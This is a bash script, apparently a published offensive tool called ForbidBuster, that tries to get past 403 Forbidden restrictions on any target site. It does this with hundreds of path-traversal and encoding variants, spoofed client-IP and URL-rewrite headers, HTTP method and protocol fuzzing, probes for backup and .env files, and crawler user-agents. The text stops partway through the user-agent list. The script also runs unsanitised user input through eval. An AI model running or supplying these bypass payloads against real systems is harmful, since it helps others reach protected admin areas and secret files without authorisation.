#!/bin/bash

# ============================================================================
#  ForbidBuster v2.0 — Advanced 403 Forbidden Bypass Toolkit
#  Author : @eh-amish
#  GitHub : https://github.com/eh-amish
#  License: MIT
# ============================================================================

# ── Colors ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
YELLOW='\033[1;33m'
RESET='\033[0m'
VIOLET='\033[38;2;138;43;226m'
ORANGE='\033[38;2;255;165;0m'
INDIGO='\033[38;2;75;0;130m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
MAGENTA='\033[0;35m'
BG_GREEN='\033[42m'
BG_RED='\033[41m'
BG_YELLOW='\033[43m'
BG_BLUE='\033[44m'
BG_MAGENTA='\033[45m'
BG_CYAN='\033[46m'

# Neon accent colors
NEON_GREEN='\033[38;2;57;255;20m'
NEON_CYAN='\033[38;2;0;255;255m'
NEON_PINK='\033[38;2;255;16;240m'
NEON_ORANGE='\033[38;2;255;95;31m'
NEON_PURPLE='\033[38;2;191;64;191m'
NEON_YELLOW='\033[38;2;255;255;0m'
NEON_RED='\033[38;2;255;50;50m'

# ── Counters ────────────────────────────────────────────────────────────────
COUNT_200=0
COUNT_403=0
COUNT_OTHER=0
TOTAL=0

# ── Banner ──────────────────────────────────────────────────────────────────
print_banner() {
    echo ""
    echo -e "${NEON_ORANGE}    ███████╗ ██████╗ ██████╗ ██████╗ ██╗██████╗ ${NEON_CYAN}██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗ ${RESET}"
    echo -e "${NEON_ORANGE}    ██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║██╔══██╗${NEON_CYAN}██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗${RESET}"
    echo -e "${NEON_ORANGE}    █████╗  ██║   ██║██████╔╝██████╔╝██║██║  ██║${NEON_CYAN}██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝${RESET}"
    echo -e "${NEON_ORANGE}    ██╔══╝  ██║   ██║██╔══██╗██╔══██╗██║██║  ██║${NEON_CYAN}██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗${RESET}"
    echo -e "${NEON_ORANGE}    ██║     ╚██████╔╝██║  ██║██████╔╝██║██████╔╝${NEON_CYAN}██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║${RESET}"
    echo -e "${NEON_ORANGE}    ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═════╝ ${NEON_CYAN}╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝${RESET}"
    echo ""
    echo -e "    ${DIM}${NEON_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo -e "    ${NEON_PINK}⚡${RESET} ${WHITE}${BOLD}Advanced 403 Forbidden Bypass Toolkit${RESET}  ${DIM}│${RESET}  ${NEON_GREEN}v2.0${RESET}  ${DIM}│${RESET}  ${NEON_CYAN}@eh-amish${RESET}  ${DIM}│${RESET}  ${DIM}github.com/eh-amish${RESET}"
    echo -e "    ${DIM}${NEON_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo ""
}

# ── Help ────────────────────────────────────────────────────────────────────
if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    print_banner
    echo -e "  ${NEON_ORANGE}Usage:${RESET} ./forbidbuster.sh ${NEON_CYAN}[URL]${RESET} ${NEON_GREEN}[path]${RESET}"
    echo ""
    echo -e "  ${WHITE}${BOLD}Examples:${RESET}"
    echo -e "    ./forbidbuster.sh ${CYAN}https://example.com${RESET} ${GREEN}admin${RESET}"
    echo -e "    ./forbidbuster.sh ${CYAN}https://example.com${RESET} ${GREEN}admin/index.php${RESET}"
    echo -e "    ./forbidbuster.sh ${CYAN}https://example.com${RESET} ${GREEN}server-status${RESET}"
    echo ""
    echo -e "  ${WHITE}${BOLD}Options:${RESET}"
    echo -e "    ${YELLOW}-h, --help${RESET}    Show this help menu"
    echo ""
    echo -e "  ${WHITE}${BOLD}Bypass Categories:${RESET}"
    echo -e "    ${NEON_PINK}●${RESET} Path Fuzzing            ${NEON_PINK}●${RESET} Header Fuzzing (IP spoofing)"
    echo -e "    ${NEON_PINK}●${RESET} HTTP Method Fuzzing      ${NEON_PINK}●${RESET} Protocol Version Fuzzing"
    echo -e "    ${NEON_PINK}●${RESET} User-Agent Fuzzing       ${NEON_PINK}●${RESET} Method Override Headers"
    echo -e "    ${NEON_PINK}●${RESET} Hop-by-Hop Abuse         ${NEON_PINK}●${RESET} Cache Poisoning / WCD"
    echo -e "    ${NEON_PINK}●${RESET} Unicode/Fullwidth Enc.   ${NEON_PINK}●${RESET} Case Switching"
    echo -e "    ${NEON_PINK}●${RESET} Referer Spoofing         ${NEON_PINK}●${RESET} Wayback Machine Check"
    echo ""
    echo -e "  ${WHITE}${BOLD}Status Indicators:${RESET}"
    echo -e "    ${NEON_GREEN}${BOLD}[★]${RESET} ${NEON_GREEN}200${RESET}  = ${NEON_GREEN}Bypass Found!${RESET}"
    echo -e "    ${NEON_RED}${BOLD}[✗]${RESET} ${RED}403${RESET}  = Forbidden (blocked)"
    echo -e "    ${NEON_YELLOW}${BOLD}[!]${RESET} ${YELLOW}405${RESET}  = Method Not Allowed"
    echo -e "    ${CYAN}${BOLD}[→]${RESET} ${CYAN}3xx${RESET}  = Redirect"
    echo -e "    ${VIOLET}${BOLD}[⚠]${RESET} ${VIOLET}5xx${RESET}  = Server Error"
    echo ""
    exit 0
fi

# ── Input validation ────────────────────────────────────────────────────────
if [[ -z "$1" || -z "$2" ]]; then
    print_banner
    echo -e "  ${RED}${BOLD}✘ Error:${RESET} Missing arguments!"
    echo -e "  ${WHITE}Usage:${RESET} ./forbidbuster.sh ${CYAN}[URL]${RESET} ${GREEN}[path]${RESET}"
    echo -e "  ${DIM}Run ./forbidbuster.sh --help for more info${RESET}"
    echo ""
    exit 1
fi

# Strip trailing slash from URL
URL="${1%/}"
PATH_TARGET="$2"

# ── Print banner ────────────────────────────────────────────────────────────
print_banner
echo -e "  ${NEON_PINK}⚡${RESET} ${WHITE}${BOLD}Target :${RESET} ${NEON_CYAN}${URL}${RESET}"
echo -e "  ${NEON_PINK}⚡${RESET} ${WHITE}${BOLD}Path   :${RESET} ${NEON_GREEN}${PATH_TARGET}${RESET}"
echo -e "  ${NEON_PINK}⚡${RESET} ${WHITE}${BOLD}Time   :${RESET} ${DIM}$(date '+%Y-%m-%d %H:%M:%S')${RESET}"
echo ""

# ── Utility: Colorize status codes with visual indicator ───────────────────
format_result() {
    local http_code="$1"
    local size="$2"

    # Handle empty/failed responses
    if [[ -z "$http_code" || "$http_code" == "000" ]]; then
        echo -e "${DIM}[${RED}ERR${RESET}${DIM}] ${RED}FAILED${RESET} ${DIM}│ Size: N/A${RESET}"
        return
    fi

    local indicator=""
    local code_color=""
    local size_display=""

    # Size formatting with color
    if [[ -n "$size" && "$size" != "0" ]]; then
        if [[ "$size" -gt 10000 ]]; then
            size_display="${NEON_GREEN}${BOLD}${size}B${RESET}"
        elif [[ "$size" -gt 1000 ]]; then
            size_display="${YELLOW}${size}B${RESET}"
        else
            size_display="${DIM}${size}B${RESET}"
        fi
    else
        size_display="${DIM}0B${RESET}"
    fi

    # Status code coloring and indicator
    if [[ "$http_code" == "200" ]]; then
        indicator="${NEON_GREEN}${BOLD}★${RESET}"
        code_color="${NEON_GREEN}${BOLD}"
    elif [[ "$http_code" =~ ^2[0-9]{2}$ ]]; then
        indicator="${GREEN}${BOLD}✓${RESET}"
        code_color="${GREEN}${BOLD}"
    elif [[ "$http_code" == "301" || "$http_code" == "302" || "$http_code" == "307" || "$http_code" == "308" ]]; then
        indicator="${CYAN}${BOLD}→${RESET}"
        code_color="${CYAN}${BOLD}"
    elif [[ "$http_code" == "403" ]]; then
        indicator="${NEON_RED}${BOLD}✗${RESET}"
        code_color="${RED}"
    elif [[ "$http_code" == "404" ]]; then
        indicator="${RED}${DIM}✗${RESET}"
        code_color="${RED}${DIM}"
    elif [[ "$http_code" == "405" ]]; then
        indicator="${NEON_YELLOW}${BOLD}!${RESET}"
        code_color="${YELLOW}${BOLD}"
    elif [[ "$http_code" =~ ^4[0-9]{2}$ ]]; then
        indicator="${RED}✗${RESET}"
        code_color="${RED}"
    elif [[ "$http_code" =~ ^5[0-9]{2}$ ]]; then
        indicator="${VIOLET}${BOLD}⚠${RESET}"
        code_color="${VIOLET}${BOLD}"
    else
        indicator="${YELLOW}?${RESET}"
        code_color="${YELLOW}"
    fi

    echo -e "[${indicator}] ${code_color}${http_code}${RESET} ${DIM}│${RESET} Size: ${size_display}"
}

# ── Utility: Track results ─────────────────────────────────────────────────
track_result() {
    local code=$1
    ((TOTAL++))
    if [[ "$code" == "200" ]]; then
        ((COUNT_200++))
    elif [[ "$code" == "403" ]]; then
        ((COUNT_403++))
    else
        ((COUNT_OTHER++))
    fi
}

# ── Utility: Make a request and print result ───────────────────────────────
do_request() {
    local label="$1"
    shift
    local response
    response=$(curl -k -s -o /dev/null -L -w "%{http_code},%{size_download}" --connect-timeout 10 --max-time 15 "$@" 2>/dev/null)
    local http_code=$(echo "$response" | cut -d',' -f1)
    local size=$(echo "$response" | cut -d',' -f2)
    track_result "$http_code"
    local result=$(format_result "$http_code" "$size")
    echo -e "    ${result} ${DIM}│${RESET} ${label}"
}

# ── Utility: Make a request with eval (for header fuzzing) ─────────────────
do_request_eval() {
    local label="$1"
    local eval_cmd="$2"
    local response
    response=$(eval "curl -k -s -o /dev/null -L -w '%{http_code},%{size_download}' --connect-timeout 10 --max-time 15 $eval_cmd" 2>/dev/null)
    local http_code=$(echo "$response" | cut -d',' -f1)
    local size=$(echo "$response" | cut -d',' -f2)
    track_result "$http_code"
    local result=$(format_result "$http_code" "$size")
    echo -e "    ${result} ${DIM}│${RESET} ${label}"
}

# ── Utility: Section header ────────────────────────────────────────────────
print_section() {
    local title=$1
    local icon=$2
    local count=$3
    echo ""
    echo -e "  ${NEON_CYAN}╔══════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "  ${NEON_CYAN}║${RESET}  ${icon}  ${WHITE}${BOLD}${title}${RESET}${count:+  ${DIM}(${count} payloads)${RESET}}"
    echo -e "  ${NEON_CYAN}╚══════════════════════════════════════════════════════════════════╝${RESET}"
    echo ""
    echo -e "    ${DIM}Status  │ Detail${RESET}"
    echo -e "    ${DIM}────────┼──────────────────────────────────────────────────${RESET}"
}


# ════════════════════════════════════════════════════════════════════════════
#  1. PATH FUZZING
# ════════════════════════════════════════════════════════════════════════════
fuzz_paths=(
    "${URL}/${PATH_TARGET}/../"
    "${URL}/${PATH_TARGET}/.."
    "${URL}/../${PATH_TARGET}"
    "${URL}/../${PATH_TARGET}/../"
    "${URL}//${PATH_TARGET}//"
    "${URL}//${PATH_TARGET}"
    "${URL}/${PATH_TARGET}//"
    "${URL}/./${PATH_TARGET}"
    "${URL}/./${PATH_TARGET}/./"
    "${URL}/.${PATH_TARGET}"
    "${URL}/./${PATH_TARGET}/."
    "${URL}/${PATH_TARGET}/../../"
    "${URL}/../../${PATH_TARGET}/../../"
    "${URL}/../../${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/../../../"
    "${URL}/../../../${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/../../..//"
    "${URL}/../../..//${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/../..//"
    "${URL}/../..//${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/../..//../"
    "${URL}/../..//../${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/../..;/"
    "${URL}/../..;/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/.././../"
    "${URL}/.././../${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/../.;/../"
    "${URL}/../.;/../${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/..//../"
    "${URL}/..//../${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/..//..;/"
    "${URL}/..//..;/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/..;//..;/"
    "${URL}/..;//..;/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}//.."
    "${URL}/${PATH_TARGET}//../../"
    "${URL}/${PATH_TARGET}//..;"
    "${URL}/${PATH_TARGET}/%00"
    "${URL}/${PATH_TARGET}%00"
    "${URL}/%00/${PATH_TARGET}"
    "${URL}/%00/${PATH_TARGET}/%00"
    "${URL}/${PATH_TARGET}/..%00/;"
    "${URL}/..%00/;${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/..%00;/"
    "${URL}/${PATH_TARGET}/..;%00/"
    "${URL}%00${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/%09"
    "${URL}/${PATH_TARGET}%09"
    "${URL}/%09/${PATH_TARGET}"
    "${URL}/%09/${PATH_TARGET}/%09/"
    "${URL}/${PATH_TARGET}/%09.."
    "${URL}/${PATH_TARGET}/..%09"
    "${URL}%09${PATH_TARGET}"
    "${URL}/..%09/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%09%3b"
    "${URL}/%09%3b/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/%0d"
    "${URL}/${PATH_TARGET}%0d"
    "${URL}/%0d/${PATH_TARGET}"
    "${URL}/%0d/${PATH_TARGET}/%0d"
    "${URL}/${PATH_TARGET}..%0d/;"
    "${URL}/..%0d/;/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/..%0d;/"
    "${URL}/${PATH_TARGET}/..;%0d/"
    "${URL}%0d${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/%20"
    "${URL}/${PATH_TARGET}%20"
    "${URL}/%20/${PATH_TARGET}"
    "${URL}/%20/${PATH_TARGET}/%20"
    "${URL}/${PATH_TARGET}/%20#"
    "${URL}/${PATH_TARGET}/%20%23"
    "${URL}/${PATH_TARGET}/%23"
    "${URL}/${PATH_TARGET}%23"
    "${URL}/%23/${PATH_TARGET}"
    "${URL}/%23/${PATH_TARGET}/%23/"
    "${URL}/${PATH_TARGET}/%23%3f"
    "${URL}/${PATH_TARGET}%23%3f"
    "${URL}/%23%3f/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%252e**"
    "${URL}%20${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%252e/"
    "${URL}/${PATH_TARGET}/%252e%252e%252f/"
    "${URL}/${PATH_TARGET}/%252e%252e%253b/"
    "${URL}/%252e%252e%253b/${PATH_TARGET}/%252e%252e%253b/"
    "${URL}/${PATH_TARGET}%252f/"
    "${URL}/${PATH_TARGET}/%252f"
    "${URL}/${PATH_TARGET}%252f%252f"
    "${URL}/%252f%252f/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/%2e/"
    "${URL}/${PATH_TARGET}%2f%2e%2e"
    "${URL}/%2e/${PATH_TARGET}"
    "${URL}/%2e/${PATH_TARGET}/%2e"
    "${URL}/${PATH_TARGET}%2e%2e"
    "${URL}/${PATH_TARGET};/"
    "${URL}/${PATH_TARGET}%2e%2e%2f"
    "${URL}/%2e%2e/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/%2e//"
    "${URL}/%2e//${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/%2e%2e/"
    "${URL}/%2e%2e%3b/${PATH_TARGET}%2e%2e%3b"
    "${URL}/${PATH_TARGET}/%2e%2f/"
    "${URL}/%2e%2f/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%2f"
    "${URL}/${PATH_TARGET}/%2f"
    "${URL}/%2f/${PATH_TARGET}"
    "${URL}/%2f/${PATH_TARGET}/%2f/"
    "${URL}/${PATH_TARGET}/..%2f"
    "${URL}/..%2f/${PATH_TARGET}"
    "${URL}/..%2f/${PATH_TARGET}/..%2f/"
    "${URL}/${PATH_TARGET}/..;%2f"
    "${URL}/${PATH_TARGET}%2f%23"
    "${URL}/${PATH_TARGET}/%2f%23"
    "${URL}/%2f%23/${PATH_TARGET}"
    "${URL}/%2f../${PATH_TARGET}"
    "${URL}/%2f../${PATH_TARGET}/%2f../"
    "${URL}/${PATH_TARGET}%2f.."
    "${URL}%2e${PATH_TARGET}"
    "${URL}%2F${PATH_TARGET}"
    "${URL}/..%2f..%2f/${PATH_TARGET}"
    "${URL}/..%2f..%2f/${PATH_TARGET}/..%2f..%2f/"
    "${URL}/${PATH_TARGET}/..%2f..%2f"
    "${URL}/${PATH_TARGET}/..;%2f..;%2f"
    "${URL}/${PATH_TARGET}/..%2f..%2f..%2f"
    "${URL}/..%2f..%2f..%2f/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/..;%2f..;%2f..;%2f"
    "${URL}/${PATH_TARGET}%3b"
    "${URL}/%3b/${PATH_TARGET}"
    "${URL}/%3b/${PATH_TARGET}/%3b/"
    "${URL}/${PATH_TARGET}/%3b"
    "${URL}%3b${PATH_TARGET}"
    "${URL}/%3b/../${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/%3b/.."
    "${URL}/${PATH_TARGET}%3b%09"
    "${URL}/%3b/%2e./${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%3b/%2e."
    "${URL}/${PATH_TARGET}/%3b/%2e."
    "${URL}/${PATH_TARGET}%3b//%2f../"
    "${URL}/%3b//%2f../${PATH_TARGET}%3b//%2f../"
    "${URL}/${PATH_TARGET}%3b/%2f%2f../"
    "${URL}/${PATH_TARGET}%ef%bc%8f"
    "${URL}/${PATH_TARGET}/%3f%23"
    "${URL}/%3f%23/${PATH_TARGET}/%3f%23"
    "${URL}%23${PATH_TARGET}"
    "${URL}/..%5c/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}/..%5c/"
    "${URL}/${PATH_TARGET}/..%ff/;"
    "${URL}/..%ff/;/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%ff"
    "${URL}/*/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}#"
    "${URL}/#${PATH_TARGET}"
    # File extension bypass
    "${URL}/${PATH_TARGET}.asp"
    "${URL}/${PATH_TARGET}.aspx"
    "${URL}/${PATH_TARGET}.bak"
    "${URL}/${PATH_TARGET}.config"
    "${URL}/${PATH_TARGET}.db"
    "${URL}/${PATH_TARGET}.env"
    "${URL}/${PATH_TARGET}.html"
    "${URL}/${PATH_TARGET}.json"
    "${URL}/${PATH_TARGET}.jsp"
    "${URL}/${PATH_TARGET}.php"
    "${URL}/${PATH_TARGET}.sql"
    "${URL}/${PATH_TARGET}.txt"
    "${URL}/${PATH_TARGET}.zip"
    "${URL}/${PATH_TARGET}.xml"
    "${URL}/${PATH_TARGET}.log"
    "${URL}/${PATH_TARGET}.old"
    "${URL}/${PATH_TARGET}.orig"
    "${URL}/${PATH_TARGET}.save"
    "${URL}/${PATH_TARGET}.swp"
    "${URL}/${PATH_TARGET}.swo"
    "${URL}/${PATH_TARGET}~"
    "${URL}/${PATH_TARGET}.inc"
    "${URL}/${PATH_TARGET}.py"
    "${URL}/${PATH_TARGET}.rb"
    "${URL}/${PATH_TARGET}.yml"
    "${URL}/${PATH_TARGET}.yaml"
    "${URL}/${PATH_TARGET}.toml"
    "${URL}/${PATH_TARGET}.ini"
    # Semicolon injection
    "${URL}/${PATH_TARGET}..;/"
    "${URL}/${PATH_TARGET};.css"
    "${URL}/${PATH_TARGET};.js"
    "${URL}/${PATH_TARGET};.png"
    "${URL}/${PATH_TARGET};.ico"
    "${URL}/${PATH_TARGET};.html"
    # Null byte + extension
    "${URL}/${PATH_TARGET}%00.json"
    "${URL}/${PATH_TARGET}%00.html"
    # Dot segment abuse
    "${URL}/${PATH_TARGET}/."
    "${URL}/${PATH_TARGET}/./"
    "${URL}/${PATH_TARGET}/./."
    "${URL}/${PATH_TARGET}/.randomstring"
)

print_section "PATH FUZZING" "🔓" "${#fuzz_paths[@]}"

for path in "${fuzz_paths[@]}"; do
    do_request "${NEON_CYAN}${path}${RESET}" "$path"
done


# ════════════════════════════════════════════════════════════════════════════
#  2. HEADER FUZZING (IP Spoofing)
# ════════════════════════════════════════════════════════════════════════════
fuzz_headers=(
    "-H 'X-Forwarded-For: localhost'"
    "-H 'X-Forwarded-For: localhost:80'"
    "-H 'X-Forwarded-For: localhost:443'"
    "-H 'X-Forwarded-For: 127.0.0.1'"
    "-H 'X-Forwarded-For: 127.0.0.1:80'"
    "-H 'X-Forwarded-For: 127.0.0.1:443'"
    "-H 'X-Forwarded-For: 2130706433'"
    "-H 'X-Forwarded-For: 0x7F000001'"
    "-H 'X-Forwarded-For: 0177.0000.0000.0001'"
    "-H 'X-Forwarded-For: 0'"
    "-H 'X-Forwarded-For: 127.1'"
    "-H 'X-Forwarded-For: 10.0.0.0'"
    "-H 'X-Forwarded-For: 10.0.0.1'"
    "-H 'X-Forwarded-For: 172.16.0.0'"
    "-H 'X-Forwarded-For: 172.16.0.1'"
    "-H 'X-Forwarded-For: 192.168.1.0'"
    "-H 'X-Forwarded-For: 192.168.1.1'"
    "-H 'X-Forwarded-For: ::1'"
    "-H 'X-Forwarded-For: 0:0:0:0:0:0:0:1'"
    "-H 'X-Forwarded-For: 0000::1'"
    "-H 'X-Forwarded-Port: 443'"
    "-H 'X-Forwarded-Port: 4443'"
    "-H 'X-Forwarded-Port: 80'"
    "-H 'X-Forwarded-Port: 8080'"
    "-H 'X-Forwarded-Port: 8443'"
    "-H 'X-Forwarded-Scheme: http'"
    "-H 'X-Forwarded-Scheme: https'"
    "-H 'X-Forwarded-Proto: http'"
    "-H 'X-Forwarded-Proto: https'"
    "-H 'Allow: GET'"
    "-H 'Allow: HEAD'"
    "-H 'Allow: POST'"
    "-H 'Allow: TRACE'"
    "-H 'Allow: CONNECT'"
    "-H 'X-Forwarded: localhost'"
    "-H 'X-Forwarded: 127.0.0.1'"
    "-H 'X-Forwarded: 127.0.0.1:443'"
    "-H 'X-Forwarded: 2130706433'"
    "-H 'X-Forwarded: 0x7F000001'"
    "-H 'X-Forwarded: 0177.0000.0000.0001'"
    "-H 'X-Forwarded: 0'"
    "-H 'X-Forwarded: 127.1'"
    "-H 'X-Forwarded: 10.0.0.0'"
    "-H 'X-Forwarded: 172.16.0.0'"
    "-H 'X-Forwarded: 192.168.1.0'"
    "-H 'X-Forwarded: 192.168.1.1'"
    "-H 'X-Original-URL: ${PATH_TARGET}'"
    "-H 'X-Rewrite-URL: ${PATH_TARGET}'"
    "-H 'X-Original-URL: /${PATH_TARGET}'"
    "-H 'X-Rewrite-URL: /${PATH_TARGET}'"
    "-H 'X-Original-URL: /admin/console'"
    "-H 'X-Rewrite-URL: /admin/console'"
    "-H 'X-Original-URL: /admin/'"
    "-H 'X-Rewrite-URL: /admin/'"
    "-H 'Content-Length: 0' -X POST"
    "-H 'Host: localhost'"
    "-H 'X-Host: localhost'"
    "-H 'X-Host: 127.0.0.1'"
    "-H 'X-ProxyUser-Ip: 127.0.0.1'"
    "-H 'X-Custom-IP-Authorization: localhost'"
    "-H 'X-Custom-IP-Authorization: localhost:80'"
    "-H 'X-Custom-IP-Authorization: localhost:443'"
    "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
    "-H 'X-Custom-IP-Authorization: 127.0.0.1:80'"
    "-H 'X-Custom-IP-Authorization: 127.0.0.1:443'"
    "-H 'X-Custom-IP-Authorization: 2130706433'"
    "-H 'X-Custom-IP-Authorization: 0x7F000001'"
    "-H 'X-Custom-IP-Authorization: 0177.0000.0000.0001'"
    "-H 'X-Custom-IP-Authorization: 0'"
    "-H 'X-Custom-IP-Authorization: 127.1'"
    "-H 'X-Custom-IP-Authorization: 10.0.0.0'"
    "-H 'X-Custom-IP-Authorization: 172.16.0.0'"
    "-H 'X-Custom-IP-Authorization: 192.168.1.0'"
    "-H 'X-Custom-IP-Authorization: 192.168.1.1'"
    "-H 'X-Remote-IP: localhost'"
    "-H 'X-Remote-IP: 127.0.0.1'"
    "-H 'X-Remote-IP: 127.0.0.1:443'"
    "-H 'X-Remote-IP: 2130706433'"
    "-H 'X-Remote-IP: 0x7F000001'"
    "-H 'X-Remote-IP: 0177.0000.0000.0001'"
    "-H 'X-Remote-IP: 0'"
    "-H 'X-Remote-IP: 127.1'"
    "-H 'X-Remote-IP: 10.0.0.0'"
    "-H 'X-Remote-IP: 172.16.0.0'"
    "-H 'X-Remote-IP: 192.168.1.0'"
    "-H 'X-Remote-IP: 192.168.1.1'"
    "-H 'X-Originating-IP: localhost'"
    "-H 'X-Originating-IP: 127.0.0.1'"
    "-H 'X-Originating-IP: 127.0.0.1:443'"
    "-H 'X-Originating-IP: 2130706433'"
    "-H 'X-Originating-IP: 0x7F000001'"
    "-H 'X-Originating-IP: 0177.0000.0000.0001'"
    "-H 'X-Originating-IP: 0'"
    "-H 'X-Originating-IP: 127.1'"
    "-H 'X-Originating-IP: 10.0.0.0'"
    "-H 'X-Originating-IP: 172.16.0.0'"
    "-H 'X-Originating-IP: 192.168.1.0'"
    "-H 'X-Originating-IP: 192.168.1.1'"
    "-H 'X-Remote-Addr: localhost'"
    "-H 'X-Remote-Addr: 127.0.0.1'"
    "-H 'X-Remote-Addr: 127.0.0.1:443'"
    "-H 'X-Remote-Addr: 2130706433'"
    "-H 'X-Remote-Addr: 0x7F000001'"
    "-H 'X-Remote-Addr: 0177.0000.0000.0001'"
    "-H 'X-Remote-Addr: 0'"
    "-H 'X-Remote-Addr: 127.1'"
    "-H 'X-Remote-Addr: 10.0.0.0'"
    "-H 'X-Remote-Addr: 172.16.0.0'"
    "-H 'X-Remote-Addr: 192.168.1.0'"
    "-H 'X-Remote-Addr: 192.168.1.1'"
    "-H 'X-Client-IP: localhost'"
    "-H 'X-Client-IP: 127.0.0.1'"
    "-H 'X-Client-IP: 127.0.0.1:443'"
    "-H 'X-Client-IP: 2130706433'"
    "-H 'X-Client-IP: 0x7F000001'"
    "-H 'X-Client-IP: 0177.0000.0000.0001'"
    "-H 'X-Client-IP: 0'"
    "-H 'X-Client-IP: 127.1'"
    "-H 'X-Client-IP: 10.0.0.0'"
    "-H 'X-Client-IP: 172.16.0.0'"
    "-H 'X-Client-IP: 192.168.1.0'"
    "-H 'X-Client-IP: 192.168.1.1'"
    "-H 'X-Real-IP: localhost'"
    "-H 'X-Real-IP: 127.0.0.1'"
    "-H 'X-Real-IP: 127.0.0.1:443'"
    "-H 'X-Real-IP: 2130706433'"
    "-H 'X-Real-IP: 0x7F000001'"
    "-H 'X-Real-IP: 0177.0000.0000.0001'"
    "-H 'X-Real-IP: 0'"
    "-H 'X-Real-IP: 127.1'"
    "-H 'X-Real-IP: 10.0.0.0'"
    "-H 'X-Real-IP: 172.16.0.0'"
    "-H 'X-Real-IP: 192.168.1.0'"
    "-H 'X-Real-IP: 192.168.1.1'"
    # ── Cloud / CDN IP headers ──
    "-H 'Cluster-Client-IP: 127.0.0.1'"
    "-H 'CF-Connecting-IP: 127.0.0.1'"
    "-H 'True-Client-IP: 127.0.0.1'"
    "-H 'Fastly-Client-IP: 127.0.0.1'"
    "-H 'X-Azure-ClientIP: 127.0.0.1'"
    "-H 'X-Cluster-Client-IP: 127.0.0.1'"
    "-H 'X-Forwarded-Host: localhost'"
    "-H 'X-Forwarded-Host: 127.0.0.1'"
    "-H 'Forwarded: for=127.0.0.1'"
    "-H 'Forwarded: for=\"[::1]\"'"
    "-H 'X-Real-IP: ::1'"
    "-H 'X-Client-IP: ::1'"
    "-H 'CF-Connecting-IP: ::1'"
    "-H 'True-Client-IP: ::1'"
)

print_section "HEADER FUZZING — IP Spoofing" "🎭" "${#fuzz_headers[@]}"

for header in "${fuzz_headers[@]}"; do
    do_request_eval "${YELLOW}${header}${RESET}" "$header '${URL}/${PATH_TARGET}'"
done


# ════════════════════════════════════════════════════════════════════════════
#  3. HTTP METHOD FUZZING
# ════════════════════════════════════════════════════════════════════════════
methods=("GET" "POST" "PUT" "PATCH" "DELETE" "HEAD" "OPTIONS" "CONNECT" "TRACE" "PROPFIND" "MOVE" "COPY" "LOCK" "UNLOCK" "MKCOL" "FAKEVERB")

print_section "HTTP METHOD FUZZING" "🔧" "${#methods[@]}"

for method in "${methods[@]}"; do
    do_request "${MAGENTA}-X ${method}${RESET}  ${DIM}→${RESET}  ${URL}/${PATH_TARGET}" -X "$method" "${URL}/${PATH_TARGET}"
done


# ════════════════════════════════════════════════════════════════════════════
#  4. HTTP PROTOCOL VERSION FUZZING
# ════════════════════════════════════════════════════════════════════════════
print_section "PROTOCOL VERSION FUZZING" "📡" "4"

proto_labels=("HTTP/0.9" "HTTP/1.0" "HTTP/1.1" "HTTP/2")
proto_flags=("--http0.9" "--http1.0" "--http1.1" "--http2")

for i in "${!proto_labels[@]}"; do
    label="${proto_labels[$i]}"
    flag="${proto_flags[$i]}"
    do_request "${CYAN}${label}${RESET}  ${DIM}→${RESET}  ${URL}/${PATH_TARGET}" "$flag" "${URL}/${PATH_TARGET}"
done


# ════════════════════════════════════════════════════════════════════════════
#  5. USER-AGENT FUZZING
# ════════════════════════════════════════════════════════════════════════════
user_agents=(
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
